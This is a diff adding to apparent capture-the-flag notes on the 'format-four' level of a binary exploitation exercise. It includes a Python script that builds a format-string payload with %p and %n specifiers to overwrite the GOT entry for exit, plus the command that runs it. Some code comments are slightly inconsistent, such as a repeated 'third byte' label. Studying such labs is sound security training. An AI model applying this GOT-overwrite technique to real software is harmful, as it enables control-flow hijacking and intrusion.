@@ -9,6 +9,58 @@ objdump -t format-four | grep congratulations
 
 congratz - the value we need to write to the saved EIP - is at 0x08048503
 
+But no - we need to write to the global offset table.
+
+# Analysing the GOT process:
+Stepping into this line:
+0x080484fe b    e82dfeffff     call sym.imp.exit          ; void exit(int status);
+
+Goes to this line:
+0x08048330      ff25e4970408   jmp dword [reloc.exit_228]  ; "C......." @ 0x80497e4
+
+Which will jump to the address specified at the address reloc.exit_228 = 0x80497e4
+pf x @reloc.exit_228
+0x080497e4 = 0xf7f7f543
+
+So if we could change the value at the address 0x080497e4 to 0x08048503, then I suppose we have won.
+
+Yep. it was that easy.
+
+```
+#!/usr/bin/python3
+
+import sys
+
+address1 = b"\x08\x04\x97\xe4"[::-1]
+address2 = b"\x08\x04\x97\xe5"[::-1]
+address3 = b"\x08\x04\x97\xe6"[::-1]
+address4 = b"\x08\x04\x97\xe7"[::-1]
+
+buf = b''
+buf += address1
+buf += b'AAAA' # Add space for extra padding using %1234p or whatever
+buf += address2
+buf += b'BBBB' # Add space for extra padding
+buf += address3
+buf += b'CCCC' # Add space for extra padding
+buf += address4
+
+# Value we want to write: 0x08048503
+buf += b'%p ' * 10 # Get to the start of the buffer
+buf += b'%153p ' # Add extra bytes to %n. It will go to 0x103.
+buf += b'%n '  # Write the first byte - 0x03. The first 0x1 in the 0x103 will be overwritten later and 0x03 will stay.
+buf += b'%128p ' # Add extra bytes to %n. It will go to 0x185.
+buf += b'%n '  # Write the second byte - 0x85
+buf += b'%125p ' # Add extra bytes to %n. It will go to 0x204.
+buf += b'%n '  # Write the third byte - 0x04
+buf += b'%258p ' # Add extra bytes to %n. It will go to 0x208.
+buf += b'%n '  # Write the third byte - 0x04
+
+with open('/home/user/input.txt', 'wb') as f:
+  f.write(buf)
+```
+
+python3 ~/format/format4/exploit.py; cat ~/input.txt | ./format-four
 
 #####################
 Format Three - 32 bit
